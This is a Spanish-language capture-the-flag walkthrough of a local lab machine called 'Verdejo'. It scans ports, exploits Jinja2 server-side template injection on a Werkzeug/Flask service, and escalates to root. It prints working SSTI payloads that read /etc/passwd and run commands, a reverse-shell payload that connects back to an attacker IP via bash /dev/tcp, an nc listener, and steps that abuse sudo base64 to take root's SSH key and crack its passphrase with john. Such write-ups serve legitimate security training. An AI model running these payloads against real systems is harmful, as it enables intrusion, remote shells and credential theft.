- Tags: #Verdejo
----
[Maquina Verdejo](https://mega.nz/file/ZasAgTpa#czwKDizDR0-eHGyzP8OG1VCj2od-Xzq0DWbFsTVXFWw) ==> Enlace de descarga al laboratorio
```bash
7z x verdejo.zip
 sudo bash auto_deploy.sh verdejo.tar
```

#### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Escaneo Puertos
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos
extractPorts allPorts # Parseamos la informacon mas relevante del primer escaneo
nmap -sC -sV -p22,80,8089 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

**( 22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) )** ==> Tenemos el servicio ssh expuesto.
**( 80/tcp   open  http    Apache httpd 2.4.59 ((Debian)) )** ==> Tenemos un servicio web expuesto.
**( 8089/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2) )** ==> Al parecer tenemos un servicio desplegado con python3

#### Fase Reconcocimiento Web:
```bash
whatweb http://172.17.0.2 # No reporta nada critico
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```

```bash
http://172.17.0.2/ # Empezamos con la enumeracion de directorios, subdirectorios y subdominios.
```

**( http://172.17.0.2:8089 )** ==> ¿Qué es Werkzeug 2.2 2?, Werkzeug es **una biblioteca de aplicaciones web WSGI** . Las versiones afectadas de este paquete son vulnerables a Directory Traversal debido a una omisión de os. path. isabs() , que permite el manejo incorrecto de rutas UNC que comienzan con / , en la función safe_join() . Tenemos un posible vector de ataque. Ya que al parecer esta corriendo por detras **flask**
[PayloadAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2) ==> Aqui usamos este recurso para poder inyectar un template como este que nos permite ver el **( /etc/passwd )**
```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

#### Ejecutando Codigo:
```bash
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }} # Usamos esta que nos permite ejecutar codigo.
```

#### Fase Intrusion:
```bash
nc -nlvp 443 # Nos ponemos en escucha

 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "exec bash -i %26>/dev/tcp/192.168.100.22/443 <%261"').read() }}# Ejecutamos el comando.
```

#### Fase Escalada Privilegios:
**Nota** ==> Una ves adentro realizamos tratamiento de la **tty**
```bash
sudo -l

User verde may run the following commands on fb524341ad17:
    (root) NOPASSWD: /usr/bin/base64
```

Podemos aprovecharnos de este binario para poder obtener la clade **id_rsa** del usuario **root** para asi podernos conectar atraves de ssh proporcionando esa cleve para acceder sin contrasena
```bash
ssh -i id_rsa root@localhost # Nos intentamos conectar, pero nos pide una clave 
ssh2john id_rsa > hash # Convertimos a hash la llave 
john hash --wordlist=/usr/share/wordlists/rockyou.txt # Procedemos a crakearlo
honda1           (id_rsa)  # Obtuvimimos este hash
chmod 600 id_rsa # Nota importante tendra que tener los permisos 600 para que funcione
ssh-keygen -R 172.17.0.2 && ssh -i id_rsa root@172.17.0.2 # Una ves que conocemos la clave intentamos conectarnos. y teniendo acceso como root
```
